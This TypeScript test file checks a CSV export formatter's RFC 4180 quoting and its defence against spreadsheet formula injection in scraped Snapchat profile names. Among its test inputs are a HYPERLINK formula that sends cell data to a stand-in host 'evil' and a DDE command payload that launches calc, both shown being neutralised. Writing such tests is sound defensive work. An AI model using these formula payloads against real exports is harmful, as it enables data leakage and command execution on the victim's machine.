/**
 * The export is the one thing the operator takes OUT of this system, and every
 * text cell in it is VLM-read Snapchat profile text -- somebody else's writing,
 * arriving unexamined. Two failures matter and neither shows up in a smoke test
 * on clean data.
 *
 * A comma or a quote in a display name shifts every column after it, so the
 * account of one row lands in the nationality of another. That is a file that
 * still opens and is silently wrong.
 *
 * And a name beginning =, +, - or @ is executed by the spreadsheet on open.
 * That is not a formatting bug, it is code the operator runs by double-clicking
 * their own export.
 *
 * Run against the formatter rather than through Postgres: what is being
 * asserted is the escaping, and a fixture would only be re-asserting the same
 * strings by a longer route.
 */
import { describe, expect, it } from 'vitest';

import { CSV_BOM, csvCell, csvRow } from './csv';

describe('csvCell quotes what RFC 4180 requires', () => {
  it('leaves a plain value alone', () => {
    expect(csvCell('john_snap')).toBe('john_snap');
    expect(csvCell(42)).toBe('42');
  });

  it('quotes a value containing the delimiter', () => {
    expect(csvCell('Smith, John')).toBe('"Smith, John"');
  });

  it('doubles an embedded quote, inside quotes', () => {
    // The classic column-shifting failure: one straight quote in a display name
    // and every later cell of the row is read into the wrong column.
    expect(csvCell('Jo "JJ" Ann')).toBe('"Jo ""JJ"" Ann"');
  });

  it('keeps an embedded newline as one cell', () => {
    expect(csvCell('two\nlines')).toBe('"two\nlines"');
    expect(csvCell('crlf\r\nname')).toBe('"crlf\r\nname"');
  });

  it('quotes leading and trailing whitespace so a trimming parser cannot eat it', () => {
    expect(csvCell('  padded  ')).toBe('"  padded  "');
  });

  it('writes an absent value as an empty cell, not the word null', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });

  it('writes a Date as ISO 8601 UTC rather than a locale string', () => {
    expect(csvCell(new Date('2026-08-14T09:30:00.000Z'))).toBe('2026-08-14T09:30:00.000Z');
  });

  it('carries emoji and accents through untouched', () => {
    expect(csvCell('Zoë 🌸')).toBe('Zoë 🌸');
  });
});

describe('csvCell neutralises spreadsheet formulas', () => {
  /**
   * The value must survive readable -- the operator is exporting real handles
   * and a mangled one is a person they cannot find again -- so it is prefixed,
   * never stripped.
   */
  it.each([
    ['=1+1', `"'=1+1"`],
    ['=HYPERLINK("http://evil/?"&A1,"open")', `"'=HYPERLINK(""http://evil/?""&A1,""open"")"`],
    ['+41 79 000', `"'+41 79 000"`],
    ['-lead', `"'-lead"`],
    ['@everyone', `"'@everyone"`],
    ['\tstartswithtab', `"'\tstartswithtab"`],
  ])('guards %s', (input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  it('leaves a formula lead in the MIDDLE of a value alone', () => {
    // Only the first character is evaluated as an expression start; guarding
    // anywhere else would corrupt ordinary names.
    expect(csvCell('a=1')).toBe('a=1');
  });

  it('does not guard a number this server computed', () => {
    // A guard here would turn a column meant to be summed into text, and no
    // number the server writes can be a formula.
    expect(csvCell(-3)).toBe('-3');
  });

  /**
   * The whole point, stated once: a hostile name is present in the file and is
   * not executable. `=` is still in the cell, and it is no longer the first
   * character the spreadsheet parses.
   */
  it('keeps the hostile value visible while making it inert', () => {
    const cell = csvCell('=cmd|\'/c calc\'!A1');
    expect(cell).toContain('=cmd');
    expect(cell.startsWith(`"'`)).toBe(true);
  });
});

describe('csvRow', () => {
  it('joins cells and terminates with CRLF', () => {
    expect(csvRow(['a', 'b'])).toBe('a,b\r\n');
  });

  /**
   * CRLF is what makes a name's own bare newline unambiguous: inside quotes it
   * stays a LF, and only a CRLF outside quotes ends a record.
   */
  it('a cell containing a newline does not end the record', () => {
    const row = csvRow(['handle', 'two\nlines', 'ok']);
    expect(row).toBe('handle,"two\nlines",ok\r\n');
    expect(row.split('\r\n').filter(Boolean)).toHaveLength(1);
  });

  it('a full row of hostile input still has exactly the cells it was given', () => {
    const row = csvRow(['@handle', 'Smith, "J"\nJr', null, '=2+2']);
    // Four cells: three quoted, one empty. Counting commas outside quotes is
    // the property -- three separators, whatever is inside them.
    expect(row).toBe(`"'@handle","Smith, ""J""\nJr",,"'=2+2"\r\n`);
  });
});

describe('CSV_BOM', () => {
  it('is the UTF-8 byte order mark Excel sniffs for', () => {
    // Without it Excel reads the file as the local ANSI codepage and every
    // accent and emoji in a display name becomes mojibake, silently.
    expect(CSV_BOM).toBe('﻿');
    expect(Buffer.from(CSV_BOM, 'utf8')).toEqual(Buffer.from([0xef, 0xbb, 0xbf]));
  });
});
